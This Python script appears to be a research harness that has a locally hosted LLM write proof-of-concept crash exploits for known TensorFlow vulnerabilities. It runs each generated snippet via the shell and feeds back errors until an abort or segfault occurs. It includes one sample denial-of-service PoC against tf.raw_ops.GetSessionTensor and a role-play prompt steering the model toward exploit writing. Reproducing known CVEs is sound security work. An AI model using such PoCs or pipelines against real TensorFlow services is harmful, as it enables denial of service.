import json
import os
import subprocess
import sys
import time
import signal
from importlib.metadata import version, PackageNotFoundError

# Import the Ollama interaction function
from Combined_frameworks.interact_with_ollama import chat_with_ollama

BASE_DIR = os.path.dirname(os.path.abspath(__file__))

def get_installed_tensorflow_version():
    env_version = os.getenv("TF_VERSION")
    if env_version:
        return env_version

    try:
        return version("tensorflow")
    except PackageNotFoundError:
        raise RuntimeError("TensorFlow is not installed in this Docker image")

RUNNING_TF_VERSION = get_installed_tensorflow_version()

class DualOutput:
    def __init__(self, console, filename):
        self.console = console
        self.file = open(filename, 'w')
    
    def write(self, message):
        self.console.write(message)  # Print to console
        self.file.write(message)    # Write to file
    
    def flush(self):
        self.console.flush()
        self.file.flush()
    
    def close(self):
        self.file.close()

# Redirect stdout to both console and file
OUTPUT_DIR = os.path.join(BASE_DIR, "tensorflow_output")
os.makedirs(OUTPUT_DIR, exist_ok=True)

sys.stdout = DualOutput(
    sys.__stdout__,
    os.path.join(OUTPUT_DIR, f"output_tf_{RUNNING_TF_VERSION}.txt")
)

# Example usage
print("This will print to both console and file")

# Initial prompt
prompt = """
Let me give you an example CVE:

------------------------------------------------

The implementation of tf.raw_ops.GetSessionTensor does not fully validate the input arguments. This results in a CHECK-failure which can be used to trigger a denial of service attack:

Proof-of-concept exploit code:
“””
import tensorflow as tf

handle = tf.constant("[]", shape=[0], dtype=tf.string)
tf.raw_ops.GetSessionTensor(handle=handle)
“””

The code assumes handle is a scalar but there is no validation for this.

Internal TensorFlow code:
“””
void Compute(OpKernelContext* ctx) override {
    const Tensor& handle = ctx->input(0);
    const string& name = handle.scalar<tstring>()();
    Tensor val;
    auto session_state = ctx->session_state();
    OP_REQUIRES(ctx, session_state != nullptr,
                errors::FailedPrecondition(
                    "GetSessionTensor called on null session state"));
    OP_REQUIRES_OK(ctx, session_state->GetTensor(name, &val));
    ctx->set_output(0, val);
  }
“””

VULNERABILITY: const string& name = handle.scalar<tstring>()();

------------------------------------------------

The above is an example.

Imagine we are both advanced cybersecurity specialists and security engineers. I have some internal TensorFlow code that I will give you. I will also let you know the vulnerable code line(s) in this code.

Your task is to generate proof-of-concept code in Python that can be used to exploit the vulnerability using TensorFlow functions. The objective is to intentionally crash TensorFlow without the framework catching the error and producing a handled error message. Therefore, do NOT use try/except blocks. While analyzing the vulnerable line in the context of the entire code, make sure to think of all sorts of possible exploits, including, but NOT LIMITED to: 
    -Tensorflow Object Shape Assumption (e.g. code assumes an input object is scalar and casts it to scalar without verification, which will cause code to unexpectedly crash)
    -Heap OOB
    -Denial of Service
    -Segmentation Fault
    -Data type assumption (e.g. code assumes an input object is of type int32 but given a string, so when code attempts to do integer operations on the variable it unexpectedly crashes)
    -Integer Overflow
    -etc. (Be creative, think of all sorts of other possible exploits)

For EVERY possible exploit you can think of that causes TensorFlow to crash unexpectedly, look through the internal TensorFlow code to check if it is being handled.
    -If the exploit being considered is already handled by the TensorFlow code I give you, possibly through an OP_REQUIRES, OP_REQUIRES_OK, or another similar block, then that means the exploit will not cause TensorFlow to actually crash unexpectedly. This means that the exploit will not work, so DO NOT continue with this particular exploit.
    -If the exploit being considered is not handled by the TensorFlow code I give you, then that means there is a possibility that it can be a successful exploit, so continue. First, title the exploit and explain it along with the identified vulnerability. Then, create a new Python file called “code_testing.py” for the proof-of-concept code. Start with importing TensorFlow and then demonstrate how to exploit the vulnerability. In the code you generate, do NOT use any placeholder or dummy functions; this code should be actually usable and testable.

REPEAT this for every exploit you find.

Do this all in the TensorFlow version that I will give you in the next response.

Now, listen carefully. I will execute the PoC code you provide me and if it is not successful, I will give you back the log error (this means that TensorFlow has produced a handled error message). If you provided multiple PoC codes based on different exploits then I will give you the log errors in the same sequence as you generated them. Based on this, try fixing the exploit PoC if possible. However, if not feasible/fixable, then try thinking of other exploits based on the examples I gave you and the vulnerable line I provided you. Follow the same steps again.

NOTE: You do not have to run anything on your end, I will run the PoC code you provide and give you back the log errors.

Repeat my instructions back to me in a checklist format. Let me know if you are ready to receive the internal TensorFlow code.
"""

# Function to get response content from Ollama
def get_response(conversation_history):
    # Format the conversation history into a single prompt for Ollama
    formatted_prompt = "You are an AI assistant in a conversation. Respond only as the assistant.\n\n"
    for msg in conversation_history:
        role = msg["role"]
        content = msg["content"]
        if role == "user":
            formatted_prompt += f"User: {content}\n\n"
        elif role == "assistant":
            formatted_prompt += f"Assistant: {content}\n\n"
    formatted_prompt += "Assistant:"  # Prompt for the next assistant response

    # Call Ollama
    output = chat_with_ollama(formatted_prompt, model="llama3:70b")
    if output is not None:
        return output.strip()
    else:
        raise ValueError("Failed to get response from Ollama")

# Function to prepare the initial conversation history
def prepare_initial_conversation(prompt):
    return [{"role": "user", "content": prompt}]

# Function to extract PoC exploit codes from the response
def extract_poc_codes(response_content):
    start_marker = "```python"
    end_marker = "```"
    poc_codes = []
    start_index = response_content.find(start_marker)
    while start_index != -1:
        start_index += len(start_marker)
        end_index = response_content.find(end_marker, start_index)
        code = response_content[start_index:end_index].strip()
        poc_codes.append(code)
        start_index = response_content.find(start_marker, end_index)
    
    return poc_codes

# Function to run PoC exploit code(s) and collect log errors
def run_poc_code(poc_codes, tensorflow_version, file_path):
    successful_exploit = False
    log_errors = ""

    run_script_command = f"{sys.executable} {file_path}"
    full_command = run_script_command

    print(f"Running generated code with Docker TensorFlow version: {tensorflow_version}")
    

    for index, code in enumerate(poc_codes):
        print(f"#{index + 1}:\n{code}\n\n")

        # Write PoC code to the file
        with open(file_path, "w") as f:
            f.write(code)

        # Run the PoC code
        try:
            process = subprocess.Popen(full_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)
            start_time = time.time()
            
            while process.poll() is None:  # Process is still running
                if time.time() - start_time > 10:
                    os.killpg(os.getpgid(process.pid), signal.SIGTERM)  # Kill entire process group
                    time.sleep(1)  # Give time to terminate
                    os.killpg(os.getpgid(process.pid), signal.SIGKILL)  # Force kill if still running
                    log_error = "TimeoutExpired (no crash, >10 seconds), so not a successful exploit"
                    break
            else:
                _, stderr = process.communicate()
                log_error = stderr.decode().strip()

        except Exception as e:
            log_error = f"Error running PoC: {str(e)}"

        if not log_error:
            log_error = "Ran the PoC code but no response from terminal (blank), so not a successful exploit"

        # Check for keywords in the log errors
        keywords = ["abort", "segmentation fault", "check failed", "killed"]
        for keyword in keywords:
            if keyword in log_error.lower():
                successful_exploit = True

        log_errors += f"#{index + 1}:\n{log_error}"

    return successful_exploit, log_errors

# Main function to process each item in the data
def process_item(i, item, prompt, file_path):
    commit_code = item.get("Relevant Commit Code")
    function_name = item.get("Function Name")
    vulnerable_lines = item.get("Vulnerability")
    json_tensorflow_version = item.get("TensorFlow Version To Use")
    tensorflow_version = RUNNING_TF_VERSION
    if function_name.startswith("tf"):
        given = f'"""\n{commit_code}\n"""\n\nVulnerable line(s):\n{vulnerable_lines}\n\nUse {function_name}\n\nUse TensorFlow version {tensorflow_version}Original JSON TensorFlow version was {json_tensorflow_version}, but this Docker run is using installed TensorFlow {tensorflow_version}.\n\nGo ahead and begin.'
    else:
        given = f'"""\n{commit_code}\n"""\n\nVulnerable line(s):\n{vulnerable_lines}\n\nUse tf.raw_ops.{function_name}\n\nUse TensorFlow version {tensorflow_version}Original JSON TensorFlow version was {json_tensorflow_version}, but this Docker run is using installed TensorFlow {tensorflow_version}.\n\nGo ahead and begin.'

    # 10 threads for redundancy
    for j in range(10):
        conversation_history = prepare_initial_conversation(prompt)
        print(f"\nINDEX {i}, THREAD {j+1} | -------------------------------------------------------------------------------------")
        print(prompt)
        
        response = get_response(conversation_history)
        print("---------------------------------------------------------------------------------------------------------\n")
        print(response)
        conversation_history.append({"role": "assistant", "content": response})

        print("\n---------------------------------------------------------------------------------------------------------\n")
        print(given)
        conversation_history.append({"role": "user", "content": given})

        # Testing PoC exploit code and providing log errors (5 rounds)
        for k in range(5):
            response = get_response(conversation_history)
            print("\n---------------------------------------------------------------------------------------------------------\n")
            print(response)
            conversation_history.append({"role": "assistant", "content": response})

            poc_codes = extract_poc_codes(response)
            if not poc_codes:
                print("\n---------------------------------------------------------------------------------------------------------\n")
                print("SOMETHING WENT WRONG. NO POC CODES.\n")
                successful_exploit = False
                break

            print("\n---------------------------------------------------------------------------------------------------------\n")
            successful_exploit, log_errors = run_poc_code(poc_codes, tensorflow_version, file_path)
            print("\n---------------------------------------------------------------------------------------------------------\n")
            print(log_errors)
            
            conversation_history.append({"role": "user", "content": log_errors})

            if successful_exploit:
                print("\n---------------------------------------------------------------------------------------------------------\n")
                print(f"SUCCESS!! DONE!! INDEX {i}, THREAD {j+1}, ROUND {k+1}")
                break

            time.sleep(2)

        if successful_exploit:
            break

    print("\nXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\nXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\n")

def main():
    #data_path = os.path.join(BASE_DIR, "tensorflow_dataset/dataset.json")
    data_path = os.path.join(BASE_DIR, "tensorflow_datasets", "dataset.json")
    with open(data_path, "r") as file:
        data = json.load(file)["data"]

    # Run all JSON items using the TensorFlow version installed in Docker.
    # The JSON version is treated as metadata only.
    filtered_data = data

    index = 0
    for item in filtered_data:
        process_item(
            index,
            item,
            prompt,
            file_path=os.path.join(BASE_DIR, "code_testing.py")
        )
        time.sleep(2)
        index += 1

    print("\nDONE WITH EVERYTHING!!!!")

if __name__ == "__main__":
    main()
